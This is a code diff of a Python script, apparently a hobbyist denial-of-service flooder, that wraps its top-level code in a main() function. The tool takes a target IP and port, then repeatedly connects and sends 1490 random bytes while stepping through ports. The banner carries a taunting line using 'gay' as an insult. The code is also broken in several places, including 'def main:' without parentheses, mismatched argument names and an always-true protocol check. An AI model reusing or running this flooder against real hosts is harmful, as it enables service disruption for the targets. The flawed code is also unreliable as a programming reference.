@@ -32,12 +32,12 @@ except ImportError:
   #year = now.month
 
 
+def main:
+  print("Simp on Lemonade1S#5327 and CNJ#0516 or you’re Gay! >_<")
+  time.sleep(2)
+  os.system("clear")
 
-print("Simp on Lemonade1S#5327 and CNJ#0516 or you’re Gay! >_<")
-time.sleep(2)
-os.system("clear")
-
-print("""
+  print("""
  ___           ___________    __________________     ______________     _____________     ______________     __________       __________
 /\  \         |\   _______\  |\                 \   |\   _______   \   |\    ____    \   |\    ____     \   |\  _______\__   |\  _______\
 \ \  \        | \  \_______  | \   \ /\   \ /\   \  | \  \______|\  \  | \   \___/\   \  | \   \___/\    \  | \ \______|\ \  | \ \_______
@@ -48,54 +48,56 @@ print("""
      
       """)
 
-parser = argparse.ArgumentParser()
+  parser = argparse.ArgumentParser()
 
-parser.add_argument('--TARGET', '--T', type = str, help = 'Target IP', required = True)
-parser.add_argument('--PORT', '--P', type = int, default = '80', help = 'Port', required = True)
-parser.add_argument('--protocol', '--p', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
+  parser.add_argument('--TARGET', '--T', type = str, help = 'Target IP', required = True)
+  parser.add_argument('--PORT', '--P', type = int, default = '80', help = 'Port', required = True)
+  parser.add_argument('--protocol', '--p', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
 
-arguments = parser.parse_args()
+  arguments = parser.parse_args()
 
-#ip = input("Target: ")
-#port = input("Port: ")
-#protocol = input("protocol(UDP/TCP): ")
+  #ip = input("Target: ")
+  #port = input("Port: ")
+  #protocol = input("protocol(UDP/TCP): ")
 
-ip = arguments.target
-port = arguments.port
-protocol = arguments.protocol
+  ip = arguments.target
+  port = arguments.port
+  protocol = arguments.protocol
 
-bytes = random._urandom(1490)
-pocket = 0
-
-
+  bytes = random._urandom(1490)
+  pocket = 0
 
 
-if protocol == "tcp" or "TCP": 
-  s = socket(AF_INET, SOCK_STREAM)
 
-elif protocol == "udp" or "UDP":
-  s = socket(AF_INET, SOCK_DGRAM)
+
+  if protocol == "tcp" or "TCP": 
+    s = socket(AF_INET, SOCK_STREAM)
+
+  elif protocol == "udp" or "UDP":
+    s = socket(AF_INET, SOCK_DGRAM)
   
-else:
-  print("undefined protocol!, Ctrl + C to close!")
+  else:
+    print("undefined protocol!, Ctrl + C to close!")
 
-os.system("clear")
-#ip = input("Target IP: ")
-#port = input("Port: ")
-#sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
-#os.system ("clear")
+  os.system("clear")
+  #sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
+  #os.system ("clear")
 
-#if sleep_time is None:
-  #sleep_time = 2 
+  #if sleep_time is None:
+    #sleep_time = 2 
 
-while True:
-  #ifndto(bytes, (ip, int(port)))
-  #s.connect((ip, int(port)))
-  s.connect((ip, port))
-  s.send(bytes)
-  pocket = pocket + 1
-  print(f"pocket{pocket}")
-  time.sleep(2)
-  port = int(port) + 1
-  if port == 65543:
-    port = int(port) - 1
+  while True:
+    #ifndto(bytes, (ip, int(port)))
+    #s.connect((ip, int(port)))
+    s.connect((ip, port))
+    s.send(bytes)
+    pocket = pocket + 1
+    print(f"pocket{pocket}")
+    time.sleep(2)
+    port = int(port) + 1
+    if port == 65543:
+      port = int(port) - 1
+      
+      
+if __name__ == "__main__":
+    main()
